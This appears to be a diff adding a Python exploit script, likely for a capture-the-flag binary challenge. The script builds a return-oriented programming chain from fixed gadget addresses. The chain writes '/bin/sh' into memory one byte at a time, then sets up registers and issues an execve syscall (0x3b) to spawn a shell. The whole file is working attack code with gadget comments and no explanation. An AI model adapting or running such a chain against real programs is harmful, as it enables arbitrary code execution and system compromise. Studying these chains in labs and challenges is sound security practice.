@@ -1,0 +1,117 @@
+payload = p64(0x4011ad)
+#0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x2f00)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x423058)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x420a77)+p32(0x33)
+# 0x0000000000420a77: add byte ptr [rax], dh; ret 1; 
+payload += p64(0x4011ad)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x6200)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x423059)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x420a77)+p32(0x33)
+# 0x0000000000420a77: add byte ptr [rax], dh; ret 1; 
+payload += p64(0x4011ad)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x6900)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x42305a)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x420a77)+p32(0x33)
+# 0x0000000000420a77: add byte ptr [rax], dh; ret 1; 
+payload += p64(0x4011ad)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x6e00)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x42305b)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x420a77)+p32(0x33)
+# 0x0000000000420a77: add byte ptr [rax], dh; ret 1; 
+payload += p64(0x4011ad)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x2f00)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x42305c)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x420a77)+p32(0x33)
+# 0x0000000000420a77: add byte ptr [rax], dh; ret 1; 
+payload += p64(0x4011ad)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x6600)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x42305d)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x420a77)+p32(0x33)
+# 0x0000000000420a77: add byte ptr [rax], dh; ret 1; 
+payload += p64(0x4011ad)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x6800)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x42305e)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x420a77)+p32(0x33)
+# 0x0000000000420a77: add byte ptr [rax], dh; ret 1; 
+payload += p64(0x4011ad)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x0)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x42305f)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x420a77)+p32(0x33)
+# 0x0000000000420a77: add byte ptr [rax], dh; ret 1; 
+payload += p64(0x40e006)+"\x00"*1
+# 0x000000000040e006: pop rsi; ret 0; 
+payload += p64(0x0)+p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x0)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x41616b)+p32(0x33)
+# 0x41616b: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x423058)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x40d089)+p32(0x33)
+# 0x000000000040d089: xchg edi, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x3b)+p64(0x41244f)
+# 0x41244f: xchg ebp, eax ; retf
+payload += p32(0x406975)+p32(0x33)
+# 0x0000000000406975: syscall; 
+payload += b''
